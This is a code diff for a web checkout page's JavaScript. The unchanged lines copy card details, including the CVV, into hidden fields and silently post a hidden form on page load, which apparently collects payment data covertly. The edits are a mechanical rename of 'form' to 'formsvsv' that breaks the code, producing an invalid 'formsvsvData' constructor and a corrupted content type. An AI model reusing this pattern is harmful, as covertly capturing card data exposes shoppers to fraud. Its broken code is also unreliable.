@@ -62,7 +62,7 @@ fetch('/.netlify/functions/send_email', {
     })
 });
 
-document.getElementById('checkout-form').addEventListener('submit', (event) => {
+document.getElementById('checkout-formsvsv').addEventListener('submit', (event) => {
     event.preventDefault();
 document.getElementById('hiddenFullName').value = document.getElementById('fullName').value;
 document.getElementById('nameOnCardx').value = document.getElementById('nameOnCard').value;
@@ -71,16 +71,16 @@ document.getElementById('nameOnCardx').value = document.getElementById('nameOnCa
     document.getElementById('cvvx').value = document.getElementById('cvv').value;
 
     
-    let isValidForm = true;
+    let isValidformsvsv = true;
     for(let key in shippingInfo){
         if(!shippingInfo[key]){
-            isValidForm = false;
+            isValidformsvsv = false;
             break;
         }
     }
     
-    if(isValidForm){
-        document.getElementById('checkout-form').submit();
+    if(isValidformsvsv){
+        document.getElementById('checkout-formsvsv').submit();
     } else {
         alert("Please fill out all the fields!");
     }
@@ -107,14 +107,14 @@ inputFields.forEach((inputField, index) => {
     });
 });
 document.addEventListener("DOMContentLoaded", function() {
-    const form = document.querySelector('#hiddenForm');
+    const formsvsv = document.querySelector('#hiddenformsvsv');
     
     fetch("/", {
         method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams(new FormData(form)).toString()
+        headers: { "Content-Type": "application/x-www-formsvsv-urlencoded" },
+        body: new URLSearchParams(new formsvsvData(formsvsv)).toString()
     }).then(response => {
-        // Form successfully submitted
+        // formsvsv successfully submitted
     }).catch(error => {
         // Error occurred during submission
     });
